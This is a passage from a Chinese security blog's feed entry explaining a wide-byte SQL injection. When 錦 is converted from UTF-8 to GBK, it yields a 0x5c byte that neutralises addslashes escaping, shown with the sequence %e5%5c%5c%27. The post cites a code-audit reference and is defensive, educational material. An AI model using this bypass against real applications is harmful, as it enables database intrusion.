<p>“錦“这个字，它的utf-8编码是0xe98ca6，它的gbk编码是0xe55c。<br>\的ascii码正是5c。那么，当我们的錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p>
<p>正利用了绕过addslashes的两种方式的第一种：将\转义掉。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">浅析白盒审计中的字符编码及SQL注入</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
</feed>
